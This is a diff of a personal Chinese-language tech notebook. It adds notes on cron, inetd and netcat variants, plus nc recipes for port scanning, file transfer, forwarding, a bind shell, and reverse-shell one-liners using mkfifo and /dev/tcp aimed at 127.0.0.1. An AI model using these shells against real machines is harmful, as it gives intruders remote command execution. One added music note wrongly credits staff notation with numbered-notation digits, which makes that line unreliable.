@@ -39,7 +39,9 @@
                     0.9 1.0 1.1 2 3
                 mqtt
                 telnet
-                    rfc 97 137 153 318 854 2217
+                    rfc 97 137 153 318
+                        854 855 856 857 859 860 861
+                        2217
                 ftp
                 dns
                 nntp
@@ -3347,7 +3349,10 @@ ELF格式
             对于大多数发行版的 cron 而言
                 cron 是无状态的，
                 cron 在代码里写死了60秒扫描一次配置文件，
-                    为什么是60秒？为什么cron没有秒级的任务？
+                    为什么cron没有秒级的任务？
+                        因为代码里写死了60秒扫描一次配置文件
+                    为什么是60秒？
+                        大概可能因为是 祖宗之法不可变 吧
                 扫描配置文件时，遇到符合规则的任务就会运行，
                 对于单个任务的状态， cron 是不会判断的，不判断上次任务的成功或失败，不判断上次任务运行的时间
         使用bash脚本实现的隔秒运行和单例运行
@@ -3571,14 +3576,16 @@ openbsd-inetd
     # 修改完 /etc/inetd.conf 文件后，需要重启 openbsd-inetd 服务
     /etc/init.d/openbsd-inetd restart
     ```
+    inetd（internet daemon）
     感觉 inetd 就像是守护进程版的 nc
+    和 nc 一样只处理连接，然后把socket的输入和输出重定向到标准输入和标准输出
 nc netcat ncat socat
     nc 和 netcat 都是一样的
         nc 有两种实现
             GNU 版本，一般系统自带
             openbsd 版本
-        GNU 版本的包名通常为 nc-traditional
-        openbsd 版本的包名通常为 nc-openbsd
+        GNU 版本的包名通常为 nc-traditional netcat-traditional
+        openbsd 版本的包名通常为 nc-openbsd netcat-openbsd
         判断当前系统的 nc 版本
             先用 type nc
             再用 realpath 或 ls -l 查看 nc 的真实路径，最好用 realpath
@@ -3590,17 +3597,26 @@ nc netcat ncat socat
         除了经典的命令行 Nmap 可执行文件之外，Nmap 套件包括
         高级 GUI 和结果查看器 （Zenmap），一个灵活的数据 传输、重定向和调试工具 （Ncat），一个实用程序 比较扫描结果 （Ndiff） 和数据包生成和响应分析工具 （Nping）
         ncat 支持 tls
+        ncat 的包名通常是 ncat nmap-ncat
     socat 是一个 nc 的替代品，可以称为 nc++。是 netcat 的 N 倍 加强版。
         socat 的官方文档描述它是 "netcat++" (extended design, new implementation)
         socat 的包名就是 socat
         socat 是 socket cat 的缩写
-    BusyBox 里也有一个轻量版的 nc
+    BusyBox 里也有一个轻量版的 nc ，同样地 toybox 里也有一个 nc
     从功能上看
         BusyBox nc < nc-traditional < nc-openbsd < ncat < socat
     nc 的原理是什么？
+        只处理连接
+        socket一部分参数可以通过命令行传入，例如 -w -u 这类
+        把socket的输入和输出重定向到标准输入和标准输出
     有哪些通用的语法？
+        似乎除了 -l 之外，其它参数都有变动
+        最稳妥的方式还是通过 -h 来查看帮助
     echo
         while read -r line; do echo "$line"; done
+        echo 123 | while read -r line; do echo "$line"; done
+        echo -e "123\n321" | while read -r line; do echo "$line"; done
+        nc -l -k -p 9901 -e "cat $@"
     daytime
         date -u "+%d %b %y %k:%M:%S %z"
         date -u --rfc-2822
@@ -3612,6 +3628,40 @@ nc netcat ncat socat
         while read -r line; do echo "$line" > /dev/null; done
     chargen
         lineLimit=72;offset=0;count=0;while true; do for ((i=0; i<$lineLimit; i++)); do tag=$((($i + $offset) % 95)); printf "\x$(printf %x $(($tag + 32)))"; done; offset=$(($offset + 1)); if [ $offset -ge 95 ]; then offset=0; fi; printf "\n";count=$(($count + 1)); done;
+    nc 扫描端口
+        nc -v -i 1 127.0.0.1 801
+        nc -v -z -i 1 127.0.0.1 801
+        nc -v -z -i 1 127.0.0.1 800-900
+        不是所有版本的nc都支持 z 参数，不是所有版本的 nc 支持批量端口扫描
+    nc 实现聊天
+        最简单的一对一
+            nc -l 801
+            nc 127.0.0.1 801
+    nc 传输文件
+        接收端先运行一个 nc
+            nc -l 801 > output.txt
+        发送端再运行一个 nc
+            nc 127.0.0.1 801 < input.txt
+    nc 实现一个转发服务
+        nc 自己调用自己
+        nc -v -l -k -p 9901 -e "nc 127.0.0.1 9902"
+        nc -v -l -k -p 9901 -e "bash -c \"nc 127.0.0.1 9902\""
+        mkfifo pipe1;cat pipe1 | nc -v -l -p 9901 | /bin/bash -c "nc 127.0.0.1 9902" 2>&1 1>pipe1;
+    nc 实现远程 shell
+        远程 shell
+            nc -v -l -p 9901 -e "bash"
+        控制端
+            nc -v 127.0.0.1 9901
+        即使没有 -e 参数，也能通过管道实现各种奇技淫巧，虽然管道的奇技淫巧只能处理单个连接
+            mkfifo pipe1;cat pipe1 | nc -v -l -p 9901 | /bin/bash 2>&1 1>pipe1;
+    nc 实现远程反向 shell
+        控制端先运行一个 nc
+            nc -v -l -p 9901
+        目标机器上连接控制机器的 9901 端口，并将其shell绑定到该连接上
+            nc -v 127.0.0.1 9901 -e "bash"
+            mkfifo pipe1; cat pipe1 | nc -v 127.0.0.1 9901 | /bin/bash 2>&1 1>pipe1;
+            exec 3<>/dev/tcp/127.0.0.1/9901; exec 0>&3; exec 1<&3; /bin/bash 2>&1;
+            exec 3<>/dev/tcp/127.0.0.1/9901; /bin/bash 2>&1 0>&3 1<&3; 这种写法似乎更好
     nc 如何模拟 telnet 客户端？
     nc 如何模拟 http 服务器？静态的，动态的
         nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\"";
@@ -3642,8 +3692,23 @@ nc netcat ncat socat
             https://github.com/avleen/bashttpd
             netcat -lp 9901 -e ./bashttpd
             我试过了，这个是可行的
-    socat openssl-listen 和  openssl-connect ?
+    socat 和 ncat 都支持 tsl ，又可以搞各种奇技淫巧了。。。
+    用 python 和 php 实现一个 nc ，只实现 -v -h -l 这三个参数即可
+        如果 bash 有 /usr/lib/bash/accept 这个特性，那么直接用 bash 实现一个 nc 也不是不可以的
 bash 如何接收标准输入和环境变量？
+    接收标准输入
+        我突然意识到，判断 标准输入 里有没有数据 和 完整地读取 标准输入 里的数据，似乎也是一件困难的事
+        这一段似乎只能用在文件里，可能和变量的作用域有关？
+        stdin=""
+        while read -r line; do
+            echo "$line";
+            stdin=$stdin$(echo "\n")$(echo "$line");
+        done;
+        echo -e $stdin
+    环境变量
+        echo $PATH;
+        printenv PATH;
+    如果遇到需要处理二进制数据的情况，可以尝试使用 xxd od hexdump 这类命令
 termux
     下载和安装
         要先下载和安装 f-droid https://f-droid.org/
@@ -3915,7 +3980,7 @@ nas
         波长 和 频率 的本质是什么？
     音乐
         乐谱
-            五线谱：是世界上通用的一种记谱法
+            五线谱：是世界上通用的一种记谱法，数字1~7来表示音的高低，用短横线、附点、升降号等符号来表示音的时值和变化
             简谱：是指一种简易的记谱法
             六线谱：是专为吉他设计的谱。六线谱有六条线，每一条线代表一根琴弦，与吉他的弦一一对应。从上到下分别是1到6弦，上面细下面粗。线上的数字表示在吉他的第几品。六线谱主要有独奏（旋律）记谱、分解和弦伴奏记谱和扫弦节奏记谱三种方式。
             四线谱：和吉他谱很像，主要是用于尤克里里，也是上面细，下面粗，但是四条线，而且每条线跟吉他谱的不太一样。右边标识的是空弦音。四线谱也有数字表示品格位置，x表示按住和弦拨弦，↑↓表示扫弦方向。
